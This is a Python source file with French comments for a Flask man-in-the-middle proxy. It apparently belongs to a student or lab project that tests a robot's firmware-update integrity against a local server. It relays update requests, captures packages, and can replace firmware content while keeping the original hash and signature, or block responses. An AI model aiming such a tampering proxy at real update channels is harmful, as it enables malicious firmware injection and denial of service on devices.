"""
Proxy man-in-the-middle (R4 - livrable L6), version minimale.

Position (docs/proxy-design.md) : robot -> proxy (8080) -> vrai serveur (5001).
Le proxy relaie /latest_version et /download, garde une copie de chaque paquet
qui passe (proxy/captures/) et applique un mode :
    transparent     relaie sans rien changer (cas de controle)
    tamper-content  remplace le contenu, garde hash et signature d'origine
    drop            bloque les reponses (deni de service)

Utilisation (depuis la racine du depot, serveur lance) :
    python -m proxy.mitm_proxy --mode transparent
"""
import argparse
import base64
import json
from pathlib import Path

import requests
from flask import Flask, Response, request

# Bloc 1 - Parametres (decision 9).
DEFAULT_PORT = 8080
DEFAULT_UPSTREAM = "http://127.0.0.1:5001"
CAPTURE_DIR = Path("proxy/captures")
MODES = ("transparent", "tamper-content", "drop")
TIMEOUT = 5


# Bloc 2 - Les modifications possibles d'un paquet intercepte.
def tamper_content(package: dict) -> dict:
    """Remplace le logiciel par celui du pirate ; hash et signature restent ceux d'origine."""
    falsifie = dict(package)
    falsifie["content"] = base64.b64encode(b"firmware pirate").decode("ascii")
    return falsifie


# Bloc 3 - Garder une copie de chaque paquet qui passe.
def capture(body: bytes, capture_dir) -> Path:
    capture_dir = Path(capture_dir)
    capture_dir.mkdir(parents=True, exist_ok=True)
    numero = len(list(capture_dir.glob("capture_*.json"))) + 1
    path = capture_dir / f"capture_{numero}.json"
    path.write_bytes(body)
    return path


# Bloc 4 - L'application du proxy.
def create_proxy(upstream=DEFAULT_UPSTREAM, mode="transparent", capture_dir=CAPTURE_DIR):
    if mode not in MODES:
        raise ValueError(f"mode inconnu : {mode}")
    app = Flask(__name__)

    def relayer(route):
        """Transmet la requete du robot au vrai serveur ; None si celui-ci ne repond pas."""
        try:
            return requests.get(f"{upstream}{route}", params=request.args, timeout=TIMEOUT)
        except requests.RequestException:
            return None

    @app.get("/latest_version")
    def latest_version():
        if mode == "drop":
            return Response("bloque par le proxy", status=503)
        reponse = relayer("/latest_version")
        if reponse is None:
            return Response("serveur injoignable", status=502)
        return Response(reponse.content, status=reponse.status_code, mimetype="application/json")

    @app.get("/download")
    def download():
        if mode == "drop":
            return Response("bloque par le proxy", status=503)
        reponse = relayer("/download")
        if reponse is None:
            return Response("serveur injoignable", status=502)
        if reponse.status_code != 200:
            return Response(reponse.content, status=reponse.status_code, mimetype="application/json")
        capture(reponse.content, capture_dir)
        body = reponse.content
        if mode == "tamper-content":
            body = json.dumps(tamper_content(json.loads(body))).encode()
        return Response(body, mimetype="application/json")

    return app


# Bloc 5 - Ligne de commande.
def main():
    parser = argparse.ArgumentParser(description="Proxy MITM entre le robot et le serveur.")
    parser.add_argument("--upstream", default=DEFAULT_UPSTREAM, help="URL du vrai serveur")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--mode", choices=MODES, default="transparent")
    args = parser.parse_args()
    print(f"Proxy en mode {args.mode} : robot -> :{args.port} -> {args.upstream}")
    create_proxy(args.upstream, args.mode).run(host="127.0.0.1", port=args.port)


if __name__ == "__main__":
    main()
